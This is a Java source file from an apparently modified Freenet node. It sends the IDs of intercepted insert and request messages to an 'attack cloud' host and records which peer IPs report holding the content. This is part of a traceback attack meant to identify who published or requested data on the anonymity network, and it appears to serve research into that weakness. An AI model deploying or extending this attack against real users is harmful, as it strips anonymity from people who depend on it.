package freenet.tools;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class TracebackMonitor extends Thread {
	private boolean _filterInsert = false;
	private boolean _filterRequest = false;
	
	private String _attackCloadIP = "";
	private String _saveDirectory = "~/Desktop/Freenet_Data/Monitor/";
	private File _outputFile = null;
	
	public void setAttackCloadIP(String ip) throws IOException
	{
		_attackCloadIP = ip;
		Date time = new Date();
		String fileName = time.toString().replace(" ", "_").replace(":", "-");
		_outputFile = new File(_saveDirectory+"attack_results_"+fileName+".dat");
		_outputFile.createNewFile();
	}
	
	public void setInsertFilter(boolean set)
	{
		_filterInsert = set;
	}
	
	public void setRequestFilter(boolean set)
	{
		_filterRequest = set;
	}
	
	public boolean shouldAttackInsert()
	{
		return _filterInsert;
	}
	
	public boolean shouldAttackRequest()
	{
		return _filterRequest;
	}
	
	public void attackInsert(long uid)
	{
		AttackThread attack = new AttackThread(true, uid, _attackCloadIP);
		attack.start();
	}
	
	public void attackRequest(long uid)
	{
		AttackThread attack = new AttackThread(false, uid, _attackCloadIP);
		attack.start();
	}

	private class AttackThread extends Thread {
		private long _uid = -1;
		private boolean _isInsert = true;
		private String _attackCloadIP = "";
		private int _attackCloadPort = 2323;

		public AttackThread(boolean isInsert, long uid, String ip) {
			_uid = uid;
			_isInsert = isInsert;
			_attackCloadIP = ip;
		}
		public void run()
		{
			try
			{
				// wait for the control flow signal to begin
				DebugTool tool = DebugTool.getInstance();
				while(isLocked(_isInsert, tool) != false )
				{
					// sleep 20 seconds and try again
					Thread.sleep(20*1000);
				}
				
				// ok we got the all clear
				Socket socket = new Socket(_attackCloadIP, _attackCloadPort);
				PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
				
				AttackResponseReader reader = new AttackResponseReader(socket.getInputStream());
				reader.start();
				out.println("TRACEBACKATTACK:"+_uid);
				reader.join(); // wait for results
				socket.close();
				
				if(_outputFile != null)
				{
					PrintWriter fileOut = new PrintWriter(_outputFile);
					if(reader.hadError())
						fileOut.print("~ERROR ");
					fileOut.print(_uid+":");
					for(ResultData d : reader.getResults())
						fileOut.print(d.ip+","+(d.present?"true":"false")+",");
					fileOut.println();
				}
				
				// tell them that we are done
				if(_isInsert)
					tool.setInsertAttackLock(true);
				else
					tool.setRequestAttackLock(true);
			}catch(Exception e)
			{
				
			}
		}
		private boolean isLocked(boolean isInsert, DebugTool tool) throws Exception
		{
			if( isInsert )
				return tool.getInsertAttackLock();
			return tool.getRequestAttackLock();
		}
	}
	
	private class AttackResponseReader extends Thread
	{
		private InputStream _input;
		private ArrayList<ResultData> _results = new ArrayList<ResultData>();
		private boolean _error = false;
		public AttackResponseReader(InputStream i)
		{
			_input = i;	
		}
		public List<ResultData> getResults()
		{
			return _results;
		}
		public boolean hadError()
		{
			return _error;
		}
        public void run() {
            try {
                BufferedReader br = new BufferedReader(new InputStreamReader(_input));
                String line;
                while ((line = br.readLine()) != null) {
                	line = line.toLowerCase();
                    if(line.startsWith("result:"))
					{
                    	String[] parsed = line.split(":");
                    	boolean present = parsed[2].equals("true");
                    	_results.add(new ResultData(parsed[1],present));
					}
                    if(line.startsWith("attack_complete"))
                    	break;
                }
            } catch (java.io.IOException e) {
            	_error = true;
            }
        }
    }
	private class ResultData
	{
		public String ip="";
		public boolean present;
		public ResultData(String s, boolean b)
		{
			ip = s;
			present = b;
		}
	}
	
}
